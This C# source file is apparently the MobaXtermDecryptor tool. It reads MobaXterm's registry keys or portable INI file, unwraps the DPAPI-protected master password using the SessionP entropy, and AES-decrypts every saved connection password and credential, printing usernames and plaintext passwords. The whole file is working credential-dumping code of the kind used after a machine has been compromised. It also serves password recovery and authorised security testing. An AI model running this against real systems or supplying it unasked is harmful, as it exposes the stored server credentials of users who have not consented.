using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using IniParser;
using IniParser.Model;

namespace MobaXtermDecryptor.Software.MobaXterm
{
    public class MobaXterm
    {
        public static (string UserPrincipalName, string MasterPasswordBase64) Sesspass = ("", "");
        public static string SessionP = "";
        private static string IniPath = "";

        public MobaXterm(string[] args)
        {
            System.Console.WriteLine("[+] Project URL: https://github.com/h0ny/MobaXtermDecryptor");

            // 通过注册表项 SessionP 判断主机上是否运行过 MobaXterm，不管是安装版本（Installer），还是便携版本（Portable）运行过都会有这个注册表项。
            string SessionP = (string)
                Registry.GetValue(
                    @"HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\",
                    "SessionP",
                    ""
                );
            if (string.IsNullOrEmpty(SessionP))
            {
                Console.WriteLine("[-] MobaXterm does not exist on this machine.");
                return;
            }

            if (args.Length >= 1)
            {
                IniPath = args[0];
            }

            Initialize();
        }

        private void Initialize()
        {
            Sesspass.UserPrincipalName = $"{Environment.UserName}@{Environment.MachineName}";

            // 通过注册表项 installed 是否存在，来判断主机上的 MobaXterm 是安装版本（Installer），还是便携版本（Portable）。
            int installed = (int)
                Registry.GetValue(
                    @"HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\",
                    "installed",
                    0
                );

            if (installed.Equals(0))
            {
                Console.WriteLine("[+] MobaXterm Portable Edition");
                if (string.IsNullOrEmpty(IniPath))
                {
                    Console.WriteLine("[-] Please enter MobaXterm.ini file path.");
                    return;
                }

                if (!File.Exists(IniPath))
                {
                    Console.WriteLine("[-] File not found.");
                    return;
                }

                // Portable: 从指定的 MobaXterm.ini 文件中获取数据。
                FromIni(IniPath);
            }
            else
            {
                Console.WriteLine("[+] MobaXterm Installer Edition");
                // Installer: 从注册表中获取数据。
                FromRegistry();
            }
        }

        private void FromIni(string iniPath)
        {
            var parser = new FileIniDataParser();
            IniData data = parser.ReadFile(iniPath);
            SessionP = data["Misc"]["SessionP"];
            string MPSetAccount = data["Misc"]["MPSetAccount"];
            string MPSetComputer = data["Misc"]["MPSetComputer"];
            Sesspass.UserPrincipalName = $"{MPSetAccount}@{MPSetComputer}";
            Sesspass.MasterPasswordBase64 = data["Sesspass"][Sesspass.UserPrincipalName];

            Console.WriteLine("[*] ----------------- Passwords -----------------");
            KeyDataCollection Passwords = data["Passwords"];
            foreach (KeyData keyData in Passwords)
            {
                Console.WriteLine("[*] Connection Name: {0}", keyData.KeyName);
                Console.WriteLine("[*] Password:        {0}",
                    DecryptWithMasterPassword(SessionP, Sesspass.MasterPasswordBase64, keyData.Value));
                Console.WriteLine("");
            }

            Console.WriteLine("[*] ----------------- Credentials -----------------");
            KeyDataCollection Credentials = data["Credentials"];
            foreach (KeyData keyData in Credentials)
            {
                string[] temp = keyData.Value.Split([':'], 2);
                string userName = temp[0];
                string encryptedData = temp[1];

                Console.WriteLine("[*] Name:     {0}", keyData.KeyName);
                Console.WriteLine("[*] Username: {0}", userName);
                Console.WriteLine("[*] Password: {0}", DecryptWithMasterPassword(
                    SessionP,
                    Sesspass.MasterPasswordBase64,
                    encryptedData
                ));
                Console.WriteLine("");
            }
        }


        public static void FromRegistry()
        {
            // DPAPI Entropy
            string SessionP = (string)
                Registry.GetValue(@"HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\", "SessionP", "") ?? string.Empty;

            // Master Password Base64 (DPAPI)
            Sesspass.MasterPasswordBase64 = (string)
                Registry.GetValue(
                    @"HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\M",
                    Sesspass.UserPrincipalName,
                    ""
                ) ?? string.Empty;

            if (string.IsNullOrEmpty(Sesspass.MasterPasswordBase64))
            {
                Console.WriteLine("[-] Master Password not found !");
                return;
            }

            // Passwords
            using (RegistryKey P = Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm\P"))
            {
                Console.WriteLine("[*] ----------------- Passwords -----------------");
                foreach (string valueName in P.GetValueNames())
                {
                    Console.WriteLine("[*] Connection Name: {0}", valueName);
                    Console.WriteLine("[*] Password:        {0}",
                        DecryptWithMasterPassword(SessionP, Sesspass.MasterPasswordBase64,
                            P.GetValue(valueName).ToString()));
                    Console.WriteLine("");
                }
            }

            // Credentials
            using (RegistryKey P = Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm\C"))
            {
                Console.WriteLine("[*] ----------------- Credentials -----------------");
                foreach (string valueName in P.GetValueNames())
                {
                    string[] temp = P.GetValue(valueName).ToString().Split([':'], 2);
                    string userName = temp[0];
                    string encryptedData = temp[1];

                    Console.WriteLine("[*] Name:     {0}", valueName);
                    Console.WriteLine("[*] Username: {0}", userName);
                    Console.WriteLine("[*] Password: {0}", DecryptWithMasterPassword(
                        SessionP,
                        Sesspass.MasterPasswordBase64,
                        encryptedData
                    ));
                    Console.WriteLine("");
                }
            }
        }


        public static string DecryptWithMasterPassword(string SessionP, string MasterPasswordBase64, string Ciphertext)
        {
            // DPAPI 数据格式固定前缀字节数组
            byte[] DPAPI_HEADER =
            [
                0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf,
                0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0,
                0x4f, 0xc2, 0x97, 0xeb
            ];

            // 将 base64 字符串解码转换为字节数组
            byte[] MasterPasswordBytes = Convert.FromBase64String(MasterPasswordBase64);

            // 将 DPAPI 前缀和 MasterPassword 拼接出完整的加密数据
            byte[] fullEncryptedData = new byte[DPAPI_HEADER.Length + MasterPasswordBytes.Length];
            Buffer.BlockCopy(DPAPI_HEADER, 0, fullEncryptedData, 0, DPAPI_HEADER.Length);
            Buffer.BlockCopy(MasterPasswordBytes, 0, fullEncryptedData, DPAPI_HEADER.Length,
                MasterPasswordBytes.Length);

            // 使用 DPAPI 解密。SessionP 为 DPAPI 加解密的 Entropy。
            byte[] temp = ProtectedData.Unprotect(
                fullEncryptedData,
                Encoding.UTF8.GetBytes(SessionP),
                DataProtectionScope.CurrentUser
            );

            // 将解密后的字节数组转换为字符串（这个字符串其实是 base64 编码过的）
            string temp2 = Encoding.UTF8.GetString(temp);

            // 将解密后的 base64 字符串解码转换为字节数组
            byte[] output = Convert.FromBase64String(temp2);

            // 提取 AES 密钥。
            byte[] aeskey = new byte[32];
            Array.Copy(output, aeskey, 32);

            // 生成初始向量
            byte[] ivbytes = AESEncrypt(new byte[16], aeskey);
            byte[] iv = new byte[16];
            Array.Copy(ivbytes, iv, 16);

            // AES 解密，获取到明文密码。
            byte[] cipherBytes = Convert.FromBase64String(Ciphertext);
            string plaintext = AESDecrypt(cipherBytes, aeskey, iv);
            return plaintext;
        }


        // -------- AES 加解密 --------
        private static byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
        {
            using (MemoryStream mStream = new MemoryStream())
            using (RijndaelManaged aes = new RijndaelManaged())
            {
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = bKey;

                using (CryptoStream cryptoStream =
                       new CryptoStream(mStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(plainBytes, 0, plainBytes.Length);
                    cryptoStream.FlushFinalBlock();
                }

                return mStream.ToArray();
            }
        }

        private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
        {
            using (MemoryStream mStream = new MemoryStream(encryptedBytes))
            using (RijndaelManaged aes = new RijndaelManaged())
            {
                aes.Mode = CipherMode.CFB;
                aes.FeedbackSize = 8;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = bKey;
                aes.IV = iv;

                using (CryptoStream cryptoStream =
                       new CryptoStream(mStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                using (StreamReader reader = new StreamReader(cryptoStream))
                {
                    return reader.ReadToEnd();
                }
            }
        }
    }
}